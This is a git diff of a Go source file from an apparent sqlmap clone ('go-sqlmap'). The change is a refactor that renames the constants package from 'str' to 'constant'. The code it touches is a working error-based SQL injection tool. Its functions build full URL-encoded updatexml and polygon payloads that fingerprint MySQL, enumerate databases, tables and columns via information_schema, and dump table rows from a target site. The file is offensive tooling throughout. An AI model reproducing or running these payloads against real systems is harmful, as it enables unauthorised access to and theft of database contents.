@@ -1,8 +1,8 @@
 package line
 
 import (
+	"github.com/EmYiQing/go-sqlmap/constant"
 	"github.com/EmYiQing/go-sqlmap/log"
-	"github.com/EmYiQing/go-sqlmap/str"
 	"github.com/EmYiQing/go-sqlmap/util"
 	"regexp"
 	"strconv"
@@ -12,13 +12,13 @@ import (
 // DetectErrorBased 检测是否存在报错注入
 func DetectErrorBased(target string, suffixList []string) (bool, string) {
 	for _, suffix := range suffixList {
-		finalPayload := target + suffix + str.Space + "Or" + str.Space +
-			str.UpdatexmlFunc + str.Space + str.Annotator
-		code, _, tempBody := util.Request(str.RequestMethod,
+		finalPayload := target + suffix + constant.Space + "Or" + constant.Space +
+			constant.UpdatexmlFunc + constant.Space + constant.Annotator
+		code, _, tempBody := util.Request(constant.RequestMethod,
 			finalPayload, nil, nil)
 		if code != -1 {
 			if strings.Contains(strings.ToLower(string(tempBody)),
-				strings.ToLower(str.ErrorBasedKeyword)) {
+				strings.ToLower(constant.ErrorBasedKeyword)) {
 				return true, suffix
 			}
 		}
@@ -28,13 +28,13 @@ func DetectErrorBased(target string, suffixList []string) (bool, string) {
 
 // GetVersionByErrorBased 报错注入方式得到版本
 func GetVersionByErrorBased(target string, suffix string) {
-	code, _, tempBody := util.Request(str.RequestMethod,
-		target+suffix+str.UpdatexmlVersionPayload, nil, nil)
+	code, _, tempBody := util.Request(constant.RequestMethod,
+		target+suffix+constant.UpdatexmlVersionPayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
 		if strings.Contains(strings.ToLower(body),
-			strings.ToLower(str.UpdatexmlErrorKeyword)) {
-			re := regexp.MustCompile(str.UpdatexmlRegex)
+			strings.ToLower(constant.UpdatexmlErrorKeyword)) {
+			re := regexp.MustCompile(constant.UpdatexmlRegex)
 			res := re.FindAllStringSubmatch(body, -1)
 			if strings.TrimSpace(res[0][1]) != "" {
 				log.Info("mysql version:" + res[0][1])
@@ -45,13 +45,13 @@ func GetVersionByErrorBased(target string, suffix string) {
 
 // GetCurrentDatabaseByErrorBased 报错注入方式得到当前数据库名
 func GetCurrentDatabaseByErrorBased(target string, suffix string) {
-	code, _, tempBody := util.Request(str.RequestMethod,
-		target+suffix+str.UpdatexmlDatabasePayload, nil, nil)
+	code, _, tempBody := util.Request(constant.RequestMethod,
+		target+suffix+constant.UpdatexmlDatabasePayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
 		if strings.Contains(strings.ToLower(body),
-			strings.ToLower(str.UpdatexmlErrorKeyword)) {
-			re := regexp.MustCompile(str.UpdatexmlRegex)
+			strings.ToLower(constant.UpdatexmlErrorKeyword)) {
+			re := regexp.MustCompile(constant.UpdatexmlRegex)
 			res := re.FindAllStringSubmatch(body, -1)
 			if strings.TrimSpace(res[0][1]) != "" {
 				log.Info("current database:" + res[0][1])
@@ -66,13 +66,13 @@ func GetAllDatabasesByErrorBased(target string, suffix string) {
 	for i := 0; ; i++ {
 		payload := target + suffix + "%20and%20updatexml(2,concat(0x7e,(select%20schema_name%20" +
 			"from%20information_schema.schemata%20limit%20" + strconv.Itoa(i) + ",1),0x7e),1)--+"
-		code, _, tempBody := util.Request(str.RequestMethod,
+		code, _, tempBody := util.Request(constant.RequestMethod,
 			payload, nil, nil)
 		if code != -1 {
 			body := string(tempBody)
 			if strings.Contains(strings.ToLower(body),
-				strings.ToLower(str.UpdatexmlErrorKeyword)) {
-				re := regexp.MustCompile(str.UpdatexmlRegex)
+				strings.ToLower(constant.UpdatexmlErrorKeyword)) {
+				re := regexp.MustCompile(constant.UpdatexmlRegex)
 				res := re.FindAllStringSubmatch(body, -1)
 				if strings.TrimSpace(res[0][1]) != "" {
 					databases = databases + res[0][1] + ","
@@ -94,13 +94,13 @@ func GetAllTablesByErrorBased(target string, suffix string, database string) {
 		payload := target + suffix + "%20and%20updatexml(2,concat(0x7e,(select%20table_name%20" +
 			"from%20information_schema.tables%20where%20table_schema='" + database +
 			"'%20limit%20" + strconv.Itoa(i) + ",1),0x7e),1)--+"
-		code, _, tempBody := util.Request(str.RequestMethod,
+		code, _, tempBody := util.Request(constant.RequestMethod,
 			payload, nil, nil)
 		if code != -1 {
 			body := string(tempBody)
 			if strings.Contains(strings.ToLower(body),
-				strings.ToLower(str.UpdatexmlErrorKeyword)) {
-				re := regexp.MustCompile(str.UpdatexmlRegex)
+				strings.ToLower(constant.UpdatexmlErrorKeyword)) {
+				re := regexp.MustCompile(constant.UpdatexmlRegex)
 				res := re.FindAllStringSubmatch(body, -1)
 				if strings.TrimSpace(res[0][1]) != "" {
 					tables = tables + res[0][1] + ","
@@ -122,13 +122,13 @@ func GetAllColumnsByErrorBased(target string, suffix string, database string, ta
 		payload := target + suffix + "%20and%20updatexml(2,concat(0x7e,(select%20column_name%20" +
 			"from%20information_schema.columns%20where%20table_name='" + table +
 			"'%20and%20table_schema='" + database + "'%20limit%20" + strconv.Itoa(i) + ",1),0x7e),1)--+"
-		code, _, tempBody := util.Request(str.RequestMethod,
+		code, _, tempBody := util.Request(constant.RequestMethod,
 			payload, nil, nil)
 		if code != -1 {
 			body := string(tempBody)
 			if strings.Contains(strings.ToLower(body),
-				strings.ToLower(str.UpdatexmlErrorKeyword)) {
-				re := regexp.MustCompile(str.UpdatexmlRegex)
+				strings.ToLower(constant.UpdatexmlErrorKeyword)) {
+				re := regexp.MustCompile(constant.UpdatexmlRegex)
 				res := re.FindAllStringSubmatch(body, -1)
 				if strings.TrimSpace(res[0][1]) != "" {
 					columns = columns + res[0][1] + ","
@@ -157,13 +157,13 @@ func GetAllDataByErrorBased(target string, suffix string, database string, table
 		payload := target + suffix + "%20and%20updatexml(2,concat(0x7e,(select%20" +
 			innerPayload + "%20from%20" + database + "." + table + "%20limit%20" +
 			strconv.Itoa(i) + ",1),0x7e),1)--+"
-		code, _, tempBody := util.Request(str.RequestMethod,
+		code, _, tempBody := util.Request(constant.RequestMethod,
 			payload, nil, nil)
 		if code != -1 {
 			body := string(tempBody)
 			if strings.Contains(strings.ToLower(body),
-				strings.ToLower(str.UpdatexmlErrorKeyword)) {
-				re := regexp.MustCompile(str.UpdatexmlRegex)
+				strings.ToLower(constant.UpdatexmlErrorKeyword)) {
+				re := regexp.MustCompile(constant.UpdatexmlRegex)
 				res := re.FindAllStringSubmatch(body, -1)
 				if strings.TrimSpace(res[0][1]) != "" {
 					data = data + res[0][1] + ","
@@ -189,13 +189,13 @@ func GetAllDataByErrorBased(target string, suffix string, database string, table
 
 // GetVersionByErrorBasedPolygon 报错注入方式得到版本
 func GetVersionByErrorBasedPolygon(target string, suffix string) {
-	code, _, tempBody := util.Request(str.RequestMethod,
-		target+suffix+str.PolygonVersionPayload, nil, nil)
+	code, _, tempBody := util.Request(constant.RequestMethod,
+		target+suffix+constant.PolygonVersionPayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
 		if strings.Contains(strings.ToLower(body),
-			strings.ToLower(str.PolygonErrorKeyword)) {
-			re := regexp.MustCompile(str.PolygonVersionRegex)
+			strings.ToLower(constant.PolygonErrorKeyword)) {
+			re := regexp.MustCompile(constant.PolygonVersionRegex)
 			res := re.FindAllStringSubmatch(body, -1)
 			log.Info("mysql version:" + res[0][1])
 		}
@@ -204,13 +204,13 @@ func GetVersionByErrorBasedPolygon(target string, suffix string) {
 
 // GetCurrentDatabaseByErrorBasedPolygon 报错注入方式得到当前数据库名
 func GetCurrentDatabaseByErrorBasedPolygon(target string, suffix string) {
-	code, _, tempBody := util.Request(str.RequestMethod,
-		target+suffix+str.PolygonDatabasePayload, nil, nil)
+	code, _, tempBody := util.Request(constant.RequestMethod,
+		target+suffix+constant.PolygonDatabasePayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
 		if strings.Contains(strings.ToLower(body),
-			strings.ToLower(str.PolygonErrorKeyword)) {
-			re := regexp.MustCompile(str.PolygonDatabaseRegex)
+			strings.ToLower(constant.PolygonErrorKeyword)) {
+			re := regexp.MustCompile(constant.PolygonDatabaseRegex)
 			res := re.FindAllStringSubmatch(body, -1)
 			log.Info("current database:" + res[0][1])
 		}
@@ -219,13 +219,13 @@ func GetCurrentDatabaseByErrorBasedPolygon(target string, suffix string) {
 
 // GetAllDatabasesByErrorBasedPolygon 报错注入方式得到所有数据库名
 func GetAllDatabasesByErrorBasedPolygon(target string, suffix string) {
-	code, _, tempBody := util.Request(str.RequestMethod,
-		target+suffix+str.PolygonAllDatabasesPayload, nil, nil)
+	code, _, tempBody := util.Request(constant.RequestMethod,
+		target+suffix+constant.PolygonAllDatabasesPayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
 		if strings.Contains(strings.ToLower(body),
-			strings.ToLower(str.PolygonErrorKeyword)) {
-			re := regexp.MustCompile(str.PolygonDataRegex)
+			strings.ToLower(constant.PolygonErrorKeyword)) {
+			re := regexp.MustCompile(constant.PolygonDataRegex)
 			res := re.FindAllStringSubmatch(body, -1)
 			log.Info("get databases success")
 			util.PrintDatabases(util.ConvertString(res[0][1]))
@@ -235,16 +235,16 @@ func GetAllDatabasesByErrorBasedPolygon(target string, suffix string) {
 
 // GetAllTablesByErrorBasedPolygon 报错注入根据数据库名获得所有表名
 func GetAllTablesByErrorBasedPolygon(target string, suffix string, database string) {
-	payload := target + suffix + str.Space + "Or" + str.Space +
+	payload := target + suffix + constant.Space + "Or" + constant.Space +
 		"polygon((select%20*%20from(select%20*%20from(select%20" +
 		"group_concat(table_name)%20from%20information_schema." +
 		"tables%20where%20table_schema='" + database + "')a)b))--+"
-	code, _, tempBody := util.Request(str.RequestMethod, payload, nil, nil)
+	code, _, tempBody := util.Request(constant.RequestMethod, payload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
 		if strings.Contains(strings.ToLower(body),
-			strings.ToLower(str.PolygonErrorKeyword)) {
-			re := regexp.MustCompile(str.PolygonDataRegex)
+			strings.ToLower(constant.PolygonErrorKeyword)) {
+			re := regexp.MustCompile(constant.PolygonDataRegex)
 			res := re.FindAllStringSubmatch(body, -1)
 			log.Info("get tables success")
 			util.PrintTables(util.ConvertString(res[0][1]))
@@ -254,17 +254,17 @@ func GetAllTablesByErrorBasedPolygon(target string, suffix string, database stri
 
 // GetAllColumnsByErrorBasedPolygon 报错注入根据数据库名和表名获得所有字段
 func GetAllColumnsByErrorBasedPolygon(target string, suffix string, database string, table string) {
-	payload := target + suffix + str.Space + "Or" + str.Space +
+	payload := target + suffix + constant.Space + "Or" + constant.Space +
 		"polygon((select%20*%20from(select%20*%20from(select%20" +
 		"group_concat(column_name)%20from%20information_schema." +
 		"columns%20where%20table_name='" + table +
 		"'%20and%20table_schema='" + database + "')a)b))--+"
-	code, _, tempBody := util.Request(str.RequestMethod, payload, nil, nil)
+	code, _, tempBody := util.Request(constant.RequestMethod, payload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
 		if strings.Contains(strings.ToLower(body),
-			strings.ToLower(str.PolygonErrorKeyword)) {
-			re := regexp.MustCompile(str.PolygonDataRegex)
+			strings.ToLower(constant.PolygonErrorKeyword)) {
+			re := regexp.MustCompile(constant.PolygonDataRegex)
 			res := re.FindAllStringSubmatch(body, -1)
 			log.Info("get columns success")
 			util.PrintColumns(util.ConvertString(res[0][1]))
@@ -274,7 +274,7 @@ func GetAllColumnsByErrorBasedPolygon(target string, suffix string, database str
 
 // GetAllDataByErrorBasedPolygon 报错注入根据输入获得所有数据
 func GetAllDataByErrorBasedPolygon(target string, suffix string, database string, table string, columns []string) {
-	start := target + suffix + str.Space + "Or" + str.Space +
+	start := target + suffix + constant.Space + "Or" + constant.Space +
 		"polygon((select%20*%20from(select%20*%20from(select%20concat("
 	var tempPayload string
 	for _, v := range columns {
@@ -286,12 +286,12 @@ func GetAllDataByErrorBasedPolygon(target string, suffix string, database string
 	for i := 0; ; i++ {
 		payload := start + result + ")%20from%20" + database + "." + table +
 			"%20limit%20+" + strconv.Itoa(i) + ",1)a)b))--+"
-		code, _, tempBody := util.Request(str.RequestMethod, payload, nil, nil)
+		code, _, tempBody := util.Request(constant.RequestMethod, payload, nil, nil)
 		if code != -1 {
 			body := string(tempBody)
 			if strings.Contains(strings.ToLower(body),
-				strings.ToLower(str.PolygonErrorKeyword)) {
-				re := regexp.MustCompile(str.PolygonFinalDataRegex)
+				strings.ToLower(constant.PolygonErrorKeyword)) {
+				re := regexp.MustCompile(constant.PolygonFinalDataRegex)
 				res := re.FindAllStringSubmatch(body, -1)
 				if res != nil {
 					data = append(data, res[0][1])
